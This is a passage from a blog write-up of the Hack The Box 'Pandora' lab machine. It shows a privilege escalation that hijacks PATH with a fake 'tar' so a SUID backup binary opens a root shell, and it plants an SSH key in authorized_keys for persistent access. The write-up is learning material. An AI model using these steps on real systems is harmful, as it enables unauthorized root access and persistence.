</span><span class="gp">matt@pandora:/var/www/pandora/pandora_console/images$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"/bin/bash &lt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2"> &gt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2"> 2&gt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2">"</span> | <span class="nb">sudo</span> /usr/bin/at now<span class="p">;</span> <span class="nb">tail</span> <span class="nt">-f</span> /dev/null
<span class="gp">&lt;2&gt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2">" | sudo /usr/bin/at now; tail -f /dev/null  
</span><span class="go">sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
sudo: unable to initialize policy plugin
bash: [12152: 1 (255)] tcsetattr: Inappropriate ioctl for device*-
</span></pre></table></code></div></div><blockquote><p>This is not working‚Ä¶</p></blockquote><h3 id="exploit"><span class="mr-2">Exploit</span><a href="#exploit" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><p>There‚Äôs other interesting binary called <strong>pandora_backup</strong> and have SUID bit.</p><p>When we execute it, it gives us:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="go">tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
Backup failed!
Check your permissions!
</span></pre></table></code></div></div><p>In order to fix this, I create an executable ‚Äútar‚Äù, and then add the path of this executable.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">matt@pandora:~$</span><span class="w"> </span><span class="nb">echo</span> <span class="s2">"/bin/bash"</span> <span class="o">&gt;</span> <span class="nb">tar</span>
<span class="gp">matt@pandora:~$</span><span class="w"> </span><span class="nb">chmod</span> +x <span class="nb">tar</span>
<span class="gp">matt@pandora:~$</span><span class="w"> </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>:<span class="nv">$PATH</span>
<span class="gp">matt@pandora:~$</span><span class="w"> </span>/usr/bin/pandora_backup 
<span class="go">PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
</span><span class="gp">root@pandora:~#</span><span class="w">
</span></pre></table></code></div></div><blockquote><p>I really need help in this part, and I also need to move netcat to ssh because the shell was blocking everything from me‚Ä¶</p></blockquote><h2 id="nc-to-ssh"><span class="mr-2">NC to SSH</span><a href="#nc-to-ssh" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This is how it is done:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>**netcat**
$ ssh-keygen -t rsa
$ cat id_rsa.pub &gt; authorized_keys
**our machine**
# copy the content of id_rsa
$ ssh -i id_rsa matt@10.10.11.136
</pre></table></code></div></div><h2 id="conclusion"><span class="mr-2">CONCLUSION</span><a href="#conclusion" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>This machine is much more difficult than Paper. The shell was giving me many problems, and I wasted a lot of time on that. My solution possibly is not the easiest one, but I‚Äôm still learning and gettin better.</p><h3 id="techniques-and-tools"><span class="mr-2">Techniques and Tools</span><a href="#techniques-and-tools" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3></h3><ol><li>nmap<li>snmpwalk<li>sqlmap<li>RCE (Remote Code Execution)<li>PE (Privilege Escalation)</ol></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/machines/'>Machines</a>, <a href='/categories/htb/'>HTB</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/easy/" class="post-tag no-text-decoration" >easy</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/tags/snmpwalk/" class="post-tag no-text-decoration" >snmpwalk</a> <a href="/tags/sqlmap/" class="post-tag no-text-decoration" >sqlmap</a> <a href="/tags/machines/" class="post-tag no-text-decoration" >machines</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=[HTB] Pandora - ISntMA&amp;url=isntma.github.io/machines/htb/pandora" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://t.me/share/url?url=isntma.github.io/machines/htb/pandora&amp;text=[HTB] Pandora - ISntMA" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/notes/brs/proyecto_8">[BRS] Proyecto 8</a><li><a href="/machines/thm/easypeasy">[THM] Easy Peasy</a><li><a href="/others/xssgame/Jefff">[XSSG] Jefff</a><li><a href="/others/xssgame/Ma-spaghet">[XSSG] Ma Spaghet!</a><li><a href="/others/xssgame/Ugandan-knuckles">[XSSG] Ugandan Knuckles</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/machines/">machines</a> <a class="post-tag" href="/tags/challenge/">challenge</a> <a class="post-tag" href="/tags/curso/">curso</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/tools/">tools</a> <a class="post-tag" href="/tags/warmups/">warmups</a> <a class="post-tag" href="/tags/xss/">xss</a> <a class="post-tag" href="/tags/cheatsheet/">cheatsheet</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/machines/htb/paper"><div class="card-body"> <em class="timeago small" data-ts="1652574240" > 2022-05-15 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>[HTB] Paper</h3><div class="text-muted small"><p> Enumeration NMAP ‚îå‚îÄ‚îÄ(kali„âøkali)-[~] ‚îî‚îÄ$ nmap -sV 10.10.11.143 Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-14 05:07 EDT Nmap scan report for 10.10.11.143 Host is up (0.045s latency). Not ...</p></div></div></a></div><div class="card"> <a href="/machines/htb/late"><div class="card-body"> <em class="timeago small" data-ts="1653849900" > 2022-05-29 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>[HTB] Late</h3><div class="text-muted small"><p> Enumeration NMAP 1 2 3 4 5 6 7 8 9 10 11 12 13 ‚ùØ nmap -sV --open 10.10.11.156 Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 11:19 CEST Nmap scan report for 10.10.11.156 Host is up (0.08...</p></div></div></a></div><div class="card"> <a href="/machines/thm/easypeasy"><div class="card-body"> <em class="timeago small" data-ts="1671042600" > 2022-12-14 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>[THM] Easy Peasy</h3><div class="text-muted small"><p> Enumeration NMAP Para empezar veremos los puertos que tenemos accesibles, para esto usamos nmap a todos los puertos. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 $ nmap -sV -sC -p- -o...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/machines/htb/paper" class="btn btn-outline-primary" prompt="Older"><p>[HTB] Paper</p></a> <a href="/machines/htb/late" class="btn btn-outline-primary" prompt="Newer"><p>[HTB] Late</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> ¬© 2023 <a href="https://github.com/isntma">ISntMA</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/machines/">machines</a> <a class="post-tag" href="/tags/challenge/">challenge</a> <a class="post-tag" href="/tags/curso/">curso</a> <a class="post-tag" href="/tags/forensics/">forensics</a> <a class="post-tag" href="/tags/tools/">tools</a> <a class="post-tag" href="/tags/warmups/">warmups</a> <a class="post-tag" href="/tags/xss/">xss</a> <a class="post-tag" href="/tags/cheatsheet/">cheatsheet</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
